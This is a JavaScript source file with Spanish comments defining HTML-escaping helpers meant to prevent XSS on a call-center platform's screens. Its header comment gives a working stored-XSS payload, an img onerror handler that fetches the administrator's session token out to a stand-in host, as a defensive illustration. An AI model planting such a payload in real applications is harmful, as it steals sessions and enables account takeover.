/* ═══════════════════════════════════════════════════════════════════
   TEXTO SEGURO

   Las pantallas arman su HTML con plantillas. Si un dato que viene de
   la base se inserta tal cual, quien haya podido escribir ese dato
   puede inyectar etiquetas y ejecutar código en el navegador de quien
   abra la pantalla. Es lo que se conoce como XSS.

   El caso real en esta plataforma: un agente escribe en las
   observaciones de una tipificación algo como

       <img src=x onerror="fetch('http://otro-sitio/?t='+sessionStorage.getItem('bpm.token'))">

   Ese texto queda en la base. Cuando el administrador abre el reporte
   de llamadas, el navegador lo interpreta como HTML, lo ejecuta y se
   lleva el identificador de sesión del administrador.

   La regla: TODO dato que venga de la base, del servidor o de lo que
   alguien escribió pasa por `texto()` antes de entrar en una plantilla.
   Lo que no hace falta escapar son los literales del propio código.
   ═══════════════════════════════════════════════════════════════════ */
'use strict';

const seguro = (() => {
  const MAPA = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };

  /** Convierte cualquier valor en texto que el navegador mostrará tal
      cual, sin interpretarlo como HTML. Sirve igual dentro de una
      etiqueta o dentro de un atributo entre comillas. */
  const texto = (valor) => {
    if (valor === null || valor === undefined) return '';
    return String(valor).replace(/[&<>"']/g, (c) => MAPA[c]);
  };

  /** Igual que `texto`, pero devuelve un guion cuando no hay valor.
      Evita repetir `${texto(x) || '—'}` en cada celda de las tablas. */
  const celda = (valor) => {
    const t = texto(valor);
    return t === '' ? '—' : t;
  };

  return { texto, celda };
})();
